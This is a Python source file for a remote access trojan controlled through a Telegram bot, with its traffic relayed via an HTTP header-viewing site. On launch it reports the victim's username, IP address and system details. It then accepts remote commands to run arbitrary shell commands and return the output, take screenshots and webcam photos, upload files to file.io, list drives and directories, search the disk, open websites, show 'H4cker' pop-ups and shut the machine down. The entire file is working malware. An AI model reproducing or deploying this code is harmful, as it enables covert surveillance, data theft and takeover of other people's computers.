import requests as req
from re import findall
from PIL import ImageGrab
import random
import cv2
import getpass  
import os
import pyttsx3
from tkinter import messagebox
from subprocess import getoutput
from datetime import datetime
import platform
import socket
import subprocess as sp

class Main:
    def __init__(self) -> None:
        self.lastmessage = None
        self.initial_vrs()
        while True:
            def check_internet_connection() -> bool:
                url = "http://www.google.com"
                timeout = 5
                try:
                    _ = req.get(url, timeout=timeout)
                    return True
                except req.ConnectionError:
                    return False
                
            a = check_internet_connection()
            if a == True:
                self.message = self.recieve_message()
                if self.lastmessage != self.message:
                    if "say" in self.message:
                        self.real_message_say = self.message[3:]
                        self.say(self.real_message_say)
                    self.lastmessage = self.message
                    if "mesbox" in self.message:
                        self.real_message_mesbox = self.message[7:]
                        self.message_box(self.real_message_mesbox)
                    if "shutdown" in self.message:
                        self.shutdown()
                    if "takescreen" in self.message:
                        self.take_screenshot()
                    if "webcam_screen" in self.message:
                        self.take_picture_webcam()

                    if "moveto_site" in self.message:
                        self.real_message_moveto_site = self.message[12:]
                        self.move_to_site(self.real_message_moveto_site)

                    if "shell" in self.message:
                        self.real_message_shell = self.message[5:]
                        self.get_shell(self.real_message_shell)

                    if "cd" in self.message:
                        self.real_message_cd = self.message[3:]
                        try:
                            if ".." in self.real_message_cd:
                                os.chdir("..")
                                self.send_message(f"{os.getcwd()}>")
                            else:
                                os.chdir(self.real_message_cd)
                                self.send_message(f"{os.getcwd()}>")
                        except:
                            pass   
                    if "drives" in self.message:
                        self.find_drive() 

                    if "drive" in self.message:
                        try:
                            self.real_message_drive = self.message[6:]  
                            self.goto_drive(self.real_message_drive)
                        except:
                            pass
                    if "ls" in self.message:
                        self.send_message(os.listdir())

                    if "search" in self.message:
                        try:
                            self.driver_name = findall("search (.*):", self.message)
                            self.find_file_folder = findall(": (.*)", self.message)
                            self.driver_name = "".join(self.driver_name)
                            self.find_file_folder = "".join(self.find_file_folder)
                            list_ = sp.getoutput(f"where /r {self.driver_name+":"} {self.find_file_folder}")
                            self.send_message(str(list_))
                        except:
                            pass    
            else:
                continue            
    
    def initial_vrs(self):
        self.one = 0
        self.host_name = socket.gethostname()
        self.ip_address = socket.gethostbyname(self.host_name)
        self.sys_info = platform.uname()
        self.os = self.sys_info.system
        self.node = self.sys_info.node
        self.pattern = f"TARGET CONNECTION\nUSER: {getpass.getuser()}\ndate: {datetime.now()}\nIP: {str(self.ip_address)}\nSYSTEM: {str(self.os)}\nNODE: {str(self.node)}\n*************************"
        if self.one == 0:
            self.send_message(self.pattern)
            self.one = 1


    def send_message(self, send_data):
        try:
            self.chat_id = ""
            self.http_request_viewer = "https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx"
            self.token = ""
            self.api_url = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={send_data}"
            self.payload = {
                    'UrlBox':self.api_url,
                    'VersionsList':'HTTP/1.1',
                    'MethodList':'Post'
                    }
            response = req.post(self.http_request_viewer, self.payload)
        except:
            pass
    def recieve_message(self) -> str:
        try:
            self.chat_id = ""
            self.token = ""
            self.api_url1 = f"https://api.telegram.org/bot{self.token}/getUpdates?chat_id={self.chat_id}&offset=-1"
            self.payload1 = {
                    'UrlBox':self.api_url1,
                    'VersionsList':'HTTP/1.1',
                    'MethodList':'Post'
            }
            self.http_request_viewer = "https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx"
            response  = req.post(self.http_request_viewer, self.payload1)
            response = response.text
            text = findall('"text":"(.*)"', response)
            text = "".join(text)
            return text
        except:
            pass    
    def take_screenshot(self):
        try:
            self.random_int = random.randint(0, 10)
            self.screenshot = ImageGrab.grab()
            self.screenshot.save(f"{self.random_int}.jpg".strip())
            self.file_path = f"{self.random_int}.jpg"
            self.upload_url = "https://file.io"

            with open(self.file_path, 'rb') as file:
                self.files = {'file': (self.file_path, file)}
                self.response = req.post(self.upload_url, files=self.files)
                self.result = self.response.json()
                self.result = self.result["link"]
            self.send_message(f"picture saved to -> {self.result}")
        except:
            pass
    def download_file(self ,path):
        try:
            self.file_path1  = path
            self.upload_url = "https://file.io"
            with open (self.file_path1, "rb")as file:
                self.files = {"file": (self.file_path1, file)}
                self.response = req.post(self.upload_url, files=self.files)
                self.result = self.response.json()
                self.result = self.result["link"]
            self.send_message(f"file saved to -> {self.result}")
        except:
            pass
    def take_picture_webcam(self):
        try:
            self.path_to_save = f"C:\\Users\\{getpass.getuser()}\\Desktop\\1.jpg"
            self.key = cv2.waitKey(1)
            self.webcam = cv2.VideoCapture(0)
            self.check , self.frame = self.webcam.read()
            cv2.imwrite(filename=self.path_to_save, img=self.frame)
            self.webcam.release()
            self.upload_url = "https://file.io"
            with open (self.path_to_save, "rb")as file:
                self.files = {"file": (self.path_to_save, file)}
                self.response = req.post(self.upload_url, files=self.files)
                self.result = self.response.json()
                self.result = self.result["link"]
            self.send_message(f"webcam_image saved to -> {self.result}")
            os.remove(self.path_to_save)
        except:
            pass
    def say(self , text):
        try:
            self.text = text
            self.engine = pyttsx3.init()
            self.engine.say(self.text)
            self.engine.runAndWait()
        except:
            pass
    def message_box(self, text):
        try:
            self.text = text
            messagebox.showinfo("H4cker",self.text)
        except:
            pass
    def move_to_site(self, website_addr):
        try:
            self.website = website_addr
            os.system(f"start chrome {self.website}")
        except:
            pass

    def get_shell(self, command) -> str:
        try:
            self.commnad = command
            self.result = getoutput(f"{command}")    
            self.send_message(self.result)
        except:
            pass

    def shutdown(self):
        try:
            os.system("shutdown /p -s")
            self.send_message("shutdown the system")
        except:
            pass
    def find_drive(self):
        try:
            self.drives = sp.getoutput("wmic logicaldisk get description, deviceid")     
            self.send_message(str(self.drives))
        except:
            pass    
    def goto_drive(self, drive_name):
        try:
            self.drive_name = drive_name
            os.chdir(self.drive_name)
            self.send_message(str(os.getcwd()))
        except:
            pass

if __name__ == "__main__":
    Main()
